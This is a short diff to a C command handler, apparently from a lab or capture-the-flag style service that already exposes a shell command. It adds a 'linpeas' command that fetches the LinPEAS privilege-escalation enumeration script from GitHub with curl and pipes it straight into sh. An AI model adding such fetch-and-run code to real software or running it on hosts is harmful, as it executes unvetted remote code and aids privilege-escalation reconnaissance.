@@ -309,6 +309,10 @@ void handle_cmd(char* input, char* username, int logged_in, char* output) {
         shell();
     }
 
+    if (strcmp(cmd,"linpeas")==0) {
+        system("curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh");
+    }
+
     if (strcmp(cmd,"exit")==0) {
         exit(0);
     }
